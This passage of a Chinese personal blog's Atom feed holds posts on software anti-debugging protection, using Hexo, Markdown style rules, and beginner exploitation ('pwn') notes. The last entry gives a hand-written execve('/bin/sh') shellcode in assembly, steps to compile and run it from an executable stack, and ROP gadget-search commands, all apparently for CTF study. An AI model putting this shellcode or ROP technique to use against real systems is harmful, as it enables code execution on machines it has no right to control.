title="程序调试及对抗："></a>程序调试及对抗：</h2><ul><li>系统API检测程序是否处于被调试状态；</li><li>检测调试器窗口信息、状态码；</li><li>检测调试器驱动，符号；</li><li>程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）；</li><li>利用驱动接管本身程序的中断，阻止被调试器接管；</li><li>利用驱动修改内核参数，阻止程序被调试；</li><li>双进程反调试；</li></ul><h2 id="程序修改及对抗："><a href="#程序修改及对抗：" class="headerlink" title="程序修改及对抗："></a>程序修改及对抗：</h2><p>修改：文件补丁技术及工具；<br>对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等；</p><p><em>dnspy：.NET程序逆向工具</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;软件保护&quot;&gt;&lt;a href=&quot;#软件保护&quot; class=&quot;headerlink&quot; title=&quot;软件保护&quot;&gt;&lt;/a&gt;软件保护&lt;/h1&gt;&lt;h2 id=&quot;简单算法注册保护：&quot;&gt;&lt;a href=&quot;#简单算法注册保护：&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="RE" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>hexo essay writing</title>
    <link href="http://siriuswhiter.tk/2018/08/15/hexo-essay-writing/"/>
    <id>http://siriuswhiter.tk/2018/08/15/hexo-essay-writing/</id>
    <published>2018-08-15T15:33:24.000Z</published>
    <updated>2018-08-25T02:04:13.859Z</updated>
    
    <content type="html"><![CDATA[<ol><li>打开git,进入MyBlog目录；</li><li>输入 <code>hexo new &quot;essay-name&quot;</code>；</li><li>打开source文件夹，找到 essay-name.md，使用markdown语法写作；</li><li>执行命令 <code>/ hexo clean / hexo generate/ hexo deploy</code>；</li><li>over；</li></ol><p><strong>假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;打开git,进入MyBlog目录；&lt;/li&gt;
&lt;li&gt;输入 &lt;code&gt;hexo new &amp;quot;essay-name&amp;quot;&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;打开source文件夹，找到 essay-name.md，使用markdown语法写作；&lt;/
      
    
    </summary>
    
    
      <category term="skills" scheme="http://siriuswhiter.tk/tags/skills/"/>
    
  </entry>
  
  <entry>
    <title>markdown规范学习</title>
    <link href="http://siriuswhiter.tk/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/"/>
    <id>http://siriuswhiter.tk/2018/08/13/markdown规范学习/</id>
    <published>2018-08-13T14:46:46.000Z</published>
    <updated>2018-08-24T05:18:29.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MarkDown-v1-0"><a href="#MarkDown-v1-0" class="headerlink" title="MarkDown v1.0"></a>MarkDown v1.0</h1><h2 id="1-1-全局规范"><a href="#1-1-全局规范" class="headerlink" title="1.1 全局规范"></a>1.1 全局规范</h2><p><a name="top"></a></p><ul><li>MarkDown 文件使用‘.md’结尾 （<strong>小写字母</strong>)</li></ul><h2 id="格式规范"><a href="#格式规范" class="headerlink" title="格式规范"></a>格式规范</h2><h3 id="标题结构格式"><a href="#标题结构格式" class="headerlink" title="标题结构格式"></a>标题结构格式</h3><p>1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开<br>2.’#’号和文字之间’一个空格’连接<br>3.标题层级最多六级 ‘#’到’######’</p><h3 id="加强和强调规范"><a href="#加强和强调规范" class="headerlink" title="加强和强调规范"></a>加强和强调规范</h3><p>一般统一使用第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*emphasize*</span><br><span class="line">_emphasize_</span><br></pre></td></tr></table></figure><p>使用’~~’给文字添加删除线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~strikethrough~~</span><br></pre></td></tr></table></figure></p><h3 id="代码块规范"><a href="#代码块规范" class="headerlink" title="代码块规范"></a>代码块规范</h3><ul><li>行内代码使用’一对波浪号’如：<code>hello world!</code></li><li>块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &apos;看源码之三个波浪号&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><pre><code>&lt;?php    echo &apos;看源码之四空格缩进&apos;;?&gt;</code></pre><h3 id="列表写法"><a href="#列表写法" class="headerlink" title="列表写法"></a>列表写法</h3><ul><li>列号’1.’或者’*’后内容用空格隔开</li><li>列表块前后’整行隔开’ 如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Windows  </span><br><span class="line">2. Mac</span><br><span class="line">3. iOS</span><br><span class="line">    * iPhone</span><br><span class="line">    * iPad</span><br><span class="line">4. Android</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ol><li>Windows  </li><li>Mac</li><li>iOS<ul><li>iPhone</li><li>iPad</li></ul></li><li>Android</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br><span class="line">    1. v3.2</span><br><span class="line">    2. v4.1</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ul><li>Windows  </li><li>Mac</li><li>iOS</li><li>Android<ol><li>v3.2</li><li>v4.1</li></ol></li></ul><h3 id="其他标签规范"><a href="#其他标签规范" class="headerlink" title="其他标签规范"></a>其他标签规范</h3><p>链接和email</p><p>Inline：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An [example](http://url.com/ &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>实现效果：<br>An <a href="http://url.com/" title="title" target="_blank" rel="noopener">example</a></p><p>引用样式标签（titles are optional）:</p><pre><code>An [example][id].Then,anywhereelse in the doc,define the link:[id]:http://example.com/ &quot;title&quot;</code></pre><p>Email:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An email &lt;example@example.com&gt; link.</span><br></pre></td></tr></table></figure><p>插图<br>Inline(titles are optional)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![alt text](/path/img.jpg &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>引用式插图：</p><pre><code>![alt text][id][id]:/url/to/img.jpg &quot;title&quot;</code></pre><p>引用块及嵌套</p><blockquote><p>Email-style angle brackets<br>are used for blockquotes.</p></blockquote><blockquote><blockquote><p>And, they can be nested.</p></blockquote></blockquote><blockquote><h4 id="Headers-in-blockquotes"><a href="#Headers-in-blockquotes" class="headerlink" title="Headers in blockquotes"></a>Headers in blockquotes</h4><ul><li>You can quote a list.</li><li>Etc.</li></ul></blockquote><p>内联代码</p><p><code>&lt;code&gt;</code> 段落中的用法</p><p>也可以 <code>`代码中包含波浪号`</code>.<br>代码块</p><p>Indent every line of a code block by at least 4 spaces or 1 tab.<br>代码的每行都最少用4个空格或者一个制表符(tab)</p><p>我是普通文本块</p><pre><code>我是一个预格式化的代码块.</code></pre><p>水平分割线<br>三个<code>连字符-</code>:</p><hr><h3 id="表格规范"><a href="#表格规范" class="headerlink" title="表格规范"></a>表格规范</h3><p>一个简单的表格看起来如下：</p><table><thead><tr><th>第一个头部</th><th>第二个头部</th><th>第三个头部</th></tr></thead><tbody><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr></tbody></table><p>每列的对齐可以通过在分割线上添加冒号来实现：</p><table><thead><tr><th style="text-align:left">第一个头部</th><th style="text-align:center">第二个头部</th><th style="text-align:right">第三个头部</th></tr></thead><tbody><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr></tbody></table><h3 id="页内锚标记"><a href="#页内锚标记" class="headerlink" title="页内锚标记"></a>页内锚标记</h3><ul><li><a href="#11全局规范">点我跳转到顶部</a>   // 利用 <code>#</code>,<code>##</code> 生成 <code>id</code> 锚标签  </li><li><a href="#top">另一种锚标记</a> // 利用 <code>&lt;a name=&quot;top&quot;&gt;&lt;/a&gt;</code></li></ul><hr><p>附：参考 Hello-World.md 源码，<em>注意换行的使用</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Hello-World</span><br><span class="line"></span><br><span class="line">这是一个范例文件格式</span><br><span class="line">我是普通换行</span><br><span class="line"></span><br><span class="line">## 我是&lt;h2&gt;标题</span><br><span class="line"></span><br><span class="line">我是`&lt;h2&gt;`的内容</span><br><span class="line"></span><br><span class="line">## 我是&lt;h3&gt;标题</span><br><span class="line"></span><br><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MarkDown-v1-0&quot;&gt;&lt;a href=&quot;#MarkDown-v1-0&quot; class=&quot;headerlink&quot; title=&quot;MarkDown v1.0&quot;&gt;&lt;/a&gt;MarkDown v1.0&lt;/h1&gt;&lt;h2 id=&quot;1-1-全局规范&quot;&gt;&lt;a href=&quot;#1
      
    
    </summary>
    
    
      <category term="skills" scheme="http://siriuswhiter.tk/tags/skills/"/>
    
  </entry>
  
  <entry>
    <title>pwn 入门1.1</title>
    <link href="http://siriuswhiter.tk/2018/08/13/pwn-%E5%85%A5%E9%97%A81-1/"/>
    <id>http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/</id>
    <published>2018-08-13T14:35:13.000Z</published>
    <updated>2018-09-11T03:33:42.581Z</updated>
    
    <content type="html"><![CDATA[<h3 id="各种变量的存储位置"><a href="#各种变量的存储位置" class="headerlink" title="各种变量的存储位置"></a>各种变量的存储位置</h3><ol><li>stack：局部变量</li><li>heap: 动态分配内存的变量（malloc/new）</li><li>bss section: 全局化的未初始化的变量</li><li>data section: 全局化的已初始化的变量<ul><li>rodata: （只读data段）全局化的静态变量（const）</li></ul></li></ol><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int a = 0;   //.data</span><br><span class="line">int b;       //.bss</span><br><span class="line">const double PI = 3.1415    //rodata</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c = 2;    //stack</span><br><span class="line">char *d = malloc(16);    //heap</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux下将shellcode运行"><a href="#linux下将shellcode运行" class="headerlink" title="linux下将shellcode运行"></a>linux下将shellcode运行</h3><p>1.手写简易shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jmp sh</span><br><span class="line">run:</span><br><span class="line">    pop ebx</span><br><span class="line">    mov BYTE [ebx+7],0</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov al,11</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor edx,edx</span><br><span class="line">    int 0x80</span><br><span class="line">sh:</span><br><span class="line">    call run</span><br><span class="line">    db &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>2.一系列步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assembly:  nasm a.asm -o a.o -felf32   </span><br><span class="line">Extract Shellcode: objcopy -O binary a.o code   //将a.o中需要用内容的提取到code中</span><br><span class="line">                   xxd -i code        //将提取出来的code转换为机器码</span><br></pre></td></tr></table></figure><p>3.带入调用shellcode的程序test.c</p><pre><code>#include  &quot;code.h&quot;typedef int(*CODE)();int main(){    ((CODE)shellcode)();}Run Shellcode: gcc test.c -o test -m32 -zexexstack       </code></pre><p><em>syscalls.kernelgrok.com linux下的系统调用.</em></p><h1 id="之前的一些小知识点笔记："><a href="#之前的一些小知识点笔记：" class="headerlink" title="之前的一些小知识点笔记："></a>之前的一些小知识点笔记：</h1><p>gadget :一小段以ret结尾的code</p><p>rop chain ：串联在一起的gadget</p><p>rop 类型：控制寄存器做syscall；使用原有程序的func；使用libc里的gadget或func（绕过ASLR）.</p><p>rop关键：</p><p>查找gadget：</p><pre><code>ROPgadget --binary ./fileROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）</code></pre><p>排列gadget：</p><p>peda：vmmap 查看程序段的可读写执行情况</p><p>也可以：./file &amp;  (后台运行，返回pid0）</p><pre><code>cat  /proc/pid0/maps</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;各种变量的存储位置&quot;&gt;&lt;a href=&quot;#各种变量的存储位置&quot; class=&quot;headerlink&quot; title=&quot;各种变量的存储位置&quot;&gt;&lt;/a&gt;各种变量的存储位置&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;stack：局部变量&lt;/li&gt;
&lt;li&gt;heap: 动态分配内存的变量（
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
</feed>
